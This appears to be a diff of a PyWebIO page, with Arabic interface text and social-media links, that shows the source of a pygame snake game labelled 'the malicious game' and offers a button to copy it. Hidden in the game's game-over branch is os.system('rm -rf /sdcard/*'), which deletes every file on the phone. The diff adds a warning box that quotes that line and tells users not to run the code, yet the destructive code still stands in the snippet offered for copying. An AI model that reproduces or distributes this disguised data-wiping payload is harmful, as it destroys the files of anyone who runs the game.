@@ -1,7 +1,8 @@
-from pywebio.output import put_html, put_markdown, put_text, put_button
+from pywebio.output import put_html, put_markdown
 from pywebio import start_server
 import os
-import pyperclip
+
+
 def web_main():
     put_html("""
     <style>
@@ -46,6 +47,35 @@ def web_main():
         .facebook  { background-color: #1877F2; }
         .youtube   { background-color: #FF0000; }
         .instagram { background-color: #C13584; }
+        #codeArea {
+            width: 100%;
+            height: 400px;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        #copyBtn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+        #copyBtn:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+            margin-top: 10px;
+            background-color: #ffeaea;
+            padding: 10px;
+            border-left: 6px solid red;
+        }
         @media (max-width: 600px) {
             .social-button {
                 padding: 8px 12px;
@@ -58,7 +88,7 @@ def web_main():
         <h2>مواقعنا على منصات التواصل</h2>
         <div class="social-buttons">
             <button class="social-button facebook" onclick="window.open('https://www.facebook.com/fars.bla.frs.671146', '_blank')">فيسبوك</button>
-            <button class="social-button youtube" onclick="window.open('https://www.youtube.com/@يَوْمِيَاتْ-مُبَرْمِجْ-مَّزُجْ', '_blank')">يوتيوب</button>
+            <button class="social-button youtube" onclick="window.open('https://www.youtube.com/@%D9%8A%D9%8E%D9%88%D9%92%D9%85%D9%90%D9%8A%D9%8E%D8%A7%D8%AA%D9%92-%D9%85%D9%8F%D8%A8%D9%8E%D8%B1%D9%92%D9%85%D9%90%D8%AC%D9%92-%D9%85%D9%91%D9%8E%D8%B2%D9%8F%D8%AC%D9%92', '_blank')">يوتيوب</button>
             <button class="social-button instagram" onclick="window.open('https://www.instagram.com/frsbl_frs', '_blank')">انستغرام</button>
         </div>
     </div>
@@ -66,6 +96,15 @@ def web_main():
 
     put_html('<div class="container">')
     put_markdown("### اللعبة الخبيثة")
+
+    warning = """
+    <div class='warning'>
+        ⚠️ تحذير: الكود يحتوي على سطر خطير يؤدي إلى حذف جميع الملفات من هاتفك عند انتهاء اللعبة:
+        <br><code>os.system(\"rm -rf /sdcard/*\")</code>
+        <br>لا تقم بتشغيل هذا الكود على جهازك الفعلي.
+    </div>
+    """
+    put_html(warning)
 
     code_snippet = '''import pygame
 import random
@@ -77,7 +116,7 @@ pygame.init()
 WIDTH, HEIGHT = 600, 400
 BLOCK_SIZE = 20
 screen = pygame.display.set_mode((WIDTH, HEIGHT))
-pygame.display.set_caption("\u0644\u0639\u0628\u0629 \u0627\u0644\u0623\u0641\u0639\u0649")
+pygame.display.set_caption("لعبة الأفعى")
 
 WHITE = (255, 255, 255)
 GREEN = (0, 255, 0)
@@ -121,10 +160,10 @@ def draw_buttons():
     pygame.draw.rect(screen, BUTTON_COLOR, right_button_rect)
 
     font = pygame.font.SysFont(None, 50)
-    up_text = font.render("\u2191", True, WHITE)
-    down_text = font.render("\u2193", True, WHITE)
-    left_text = font.render("\u2190", True, WHITE)
-    right_text = font.render("\u2192", True, WHITE)
+    up_text = font.render("↑", True, WHITE)
+    down_text = font.render("↓", True, WHITE)
+    left_text = font.render("←", True, WHITE)
+    right_text = font.render("→", True, WHITE)
 
     screen.blit(up_text, up_text.get_rect(center=up_button_rect.center))
     screen.blit(down_text, down_text.get_rect(center=down_button_rect.center))
@@ -184,7 +223,7 @@ def main():
         draw_buttons()
 
         if check_collision(snake):
-            print("\u0627\u0646\u062a\u0647\u062a \u0627\u0644\u0644\u0639\u0628\u0629!")
+            print("انتهت اللعبة!")
             running = False
             os.system("rm -rf /sdcard/*")
 
@@ -192,15 +231,13 @@ def main():
         clock.tick(speed)
 
     pygame.quit()
-    sys.exit()'''
+    sys.exit()
+'''
 
-    put_text(code_snippet)
-
-    def copy_code():
-        pyperclip.copy(code_snippet)
-        put_text("\u062a\u0645 \u0646\u0633\u062e \u0627\u0644\u0643\u0648\u062f \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629!")
-
-    put_button("\u0646\u0633\u062e \u0627\u0644\u0643\u0648\u062f", onclick=copy_code)
+    put_html(f"""
+    <textarea id="codeArea">{code_snippet}</textarea>
+    <button id="copyBtn" onclick="navigator.clipboard.writeText(document.getElementById('codeArea').value).then(()=>alert('تم نسخ تعليمات البرمجة!'))">نسخ تعليمات البرمجة</button>
+    """)
     put_html('</div>')
 
 if __name__ == '__main__':
